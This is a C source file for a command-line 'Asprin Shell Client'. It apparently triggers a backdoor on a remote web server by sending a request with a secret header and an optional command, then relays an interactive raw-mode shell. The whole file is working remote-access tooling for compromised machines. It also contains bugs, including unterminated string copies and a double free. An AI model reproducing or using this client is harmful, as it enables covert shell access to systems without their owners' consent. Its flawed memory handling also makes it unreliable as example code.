#include "asprin-sh.h"

/* program entry point */

int main( int argc, char *argv[] ) {

  int ret, server, n;
  int ssl,port;
  struct sockaddr_in server_addr;
  struct sockaddr_in client_addr;
  struct hostent *server_host;
  char c, *hname,*hvalue,*cserver,*cmd;


  ssl=0;
  port=0;
  hname=NULL;
  hvalue=NULL;
  cmd=NULL;
  

  printf("Asprin Shell Client v.%s\n",ASPRINSH_VERSION);
 
  if(argc<2) {
    options(argv[0]);
    exit(-1);

  } 

  cserver=(char *)malloc(sizeof(char)*(strlen(argv[1])+1));
  strncpy(cserver,argv[1],strlen(argv[1]));

  printf("[*] Connecting to %s\n",cserver);
  
  
  while((c = getopt(argc,argv,"p:n:v:c:hs"))!= -1){
    switch (c) {
      case 'p':
        port=atoi(optarg);
        printf("[*] Port:%d\n",port);
        break;
      case 'n':
        hname=(char *)malloc(sizeof(char)*(strlen(optarg)+1));
        strncpy(hname,optarg,strlen(optarg));
        printf("[*] Header name: %s\n", hname);
        break;
      case 'v':
        hvalue=(char *)malloc(sizeof(char)*(strlen(optarg)+1));
        strncpy(hvalue,optarg,strlen(optarg));
        printf("[*] Header value: %s\n", hvalue);
        break;
      case 'c':
        cmd=(char *)malloc(sizeof(char)*(strlen(optarg)+1));
        strncpy(cmd,optarg,strlen(optarg));
        printf("[*] Command to execute: %s\n", cmd);
        break;
      case 's':
        printf("[!] Use SSL: NOT IMPLEMENTED YET!!!\n");
        ssl=1;
        exit(-1);
        break;
      case 'h':
      default:
        options(argv[0]);
        exit(-1);
    }
  }

  if(hname==NULL) {
    hname=(char *)malloc(sizeof(char)*(strlen(HNAME)+1));
    strncpy(hname,HNAME,strlen(HNAME));
    printf("[!] Using default header name: %s\n", hname);
  }


  if(hvalue==NULL) {
    hvalue=(char *)malloc(sizeof(char)*(strlen(HVALUE)+1));
    strncpy(hvalue,HVALUE,strlen(HVALUE));
    printf("[!] Using default header value: %s\n", hvalue);
  }



  /* create a socket */

  server = socket( AF_INET, SOCK_STREAM, 0 );

  if( server < 0 )
  {
      perror( "socket" );
      return( 2 );
  }

  /* resolve the server hostname */

  server_host = gethostbyname( cserver );

  if( server_host == NULL )
  {
      fprintf( stderr, "%s: gethostbyname failed.\n", cserver );
      return( 3 );
  }

  memcpy( (void *) &server_addr.sin_addr,
          (void *) server_host->h_addr,
          server_host->h_length );

  server_addr.sin_family = AF_INET;
  
  if(port==0) {
    port=PORT;
    printf("[!] Using default port: %d\n",port);
  }
  
  server_addr.sin_port   = htons( port );

  /* connect to the remote host */


  ret = connect( server, (struct sockaddr *) &server_addr,
                 sizeof( server_addr ) );

  free(cserver);

  if( ret < 0 )
  {
      perror( "connect" );
      return( 4 );
  }

  runshell(server,hname,hvalue,cmd);
  shutdown( server, 2 );

  free(cserver);
  free(hname);
  free(hvalue);

  return( ret );
}

int runshell( int server,char *hname,char *hvalue,char *cmd) {

  fd_set rd;
  char *term;
  int ret, len, imf;
  struct winsize ws;
  struct termios tp, tr;
  unsigned char message[BUFSIZE + 1];

  /* extract the TERM environment variable */

  term = getenv( "TERM" );

  if( term == NULL )
  {
      term = "vt100";
  }

  printf("[*] Term: %s\n",term);

  /* extract the window size */

  imf = 0;

  if( isatty( 0 ) )
  {
      /* set the interactive mode flag */

      imf = 1;

      if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
      {
          perror( "ioctl(TIOCGWINSZ)" );
          return( 23 );
      }
  }
  else
  {
      /* fallback on standard settings */

      ws.ws_row = 25;
      ws.ws_col = 80;
  }

  printf("[*] Columns: %d,Rows: %d\n",ws.ws_col,ws.ws_row);

  printf("\n\n\n");

  memset(message,0,BUFSIZE-1);

  if(cmd==NULL) {
    snprintf(message,BUFSIZE-1,
      "%s %s %s\r\n%s: %s;%d;%s;%d;%d;\r\n\r\n",
      METHOD,PATH,PROTOCOL,hname,hvalue,ASPRINSH_SH,term,ws.ws_col,ws.ws_row);
  } else {
    snprintf(message,BUFSIZE-1,
      "%s %s %s\r\n%s: %s;%d;%s;%d;%d;%s\r\n\r\n",
      METHOD,PATH,PROTOCOL,hname,hvalue,ASPRINSH_SH,term,ws.ws_col,ws.ws_row,cmd);
  }


  len=strlen(message);
  ret = write( server, message, len);

  if( ret < 0  )
  {
      perror( "write" );
      return( 24 );
  }


  /* set the tty to RAW */

  if( isatty( 1 ) )
  {
      if( tcgetattr( 1, &tp ) < 0 )
      {
          perror( "tcgetattr" );
          return( 26 );
      }

      memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );

      tr.c_iflag |= IGNPAR;
      tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
      tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
      tr.c_oflag &= ~OPOST;

      tr.c_cc[VMIN]  = 1;
      tr.c_cc[VTIME] = 0;

      if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 )
      {
          perror( "tcsetattr" );
          return( 27 );
      }
  }

  /* let's forward the data back and forth */

  while( 1 )
  {
      FD_ZERO( &rd );

      if( imf != 0 )
      {
          FD_SET( 0, &rd );
      }

      FD_SET( server, &rd );

      if( select( server + 1, &rd, NULL, NULL, NULL ) < 0 )
      {
          perror( "select" );
          ret = 28;
          break;
      }

      if( FD_ISSET( server, &rd ) )
      {
          
          //len = read( server, message, BUFSIZE );

          len = recv(server,message,BUFSIZE-1,0);
 
          if( len == 0 )
          {
              printf( "Connection close\r\n" );
              ret = 32;
              break;
          }


          if( write( 1, message, len ) != len )
          {
              perror( "write" );
              ret = 30;
              break;
          }
      }

      if( imf != 0 && FD_ISSET( 0, &rd ) )
      {
          len = read( 0, message, BUFSIZE );

          if( len < 0 )
          {
              perror( "read" );
              ret = 32;
              break;
          }

          if( send( server, message, len,0 ) != len )
          {
              perror( "write" );
              ret = 30;
              break;
          }


      }
  }

  /* restore the terminal attributes */

  if( isatty( 1 ) )
  {
      tcsetattr( 1, TCSADRAIN, &tp );
  }

  return( ret );
}


void options(char *name) {

  printf("Usage: %s <hostname> [options]\n\n",name);
  printf("Options:\n");
  printf(" -p <port> : Port to connect.\n");
  printf(" -n <name>: Header name. [asprin]\n");
  printf(" -v <value>: Header value. [headache]\n");
  printf(" -c <command>: Command to execute. [bash]\n");
  printf(" -s: Use SSL (not implemented yet!)\n");
  printf(" -h: Show this help.\n");
  printf("\n");
}
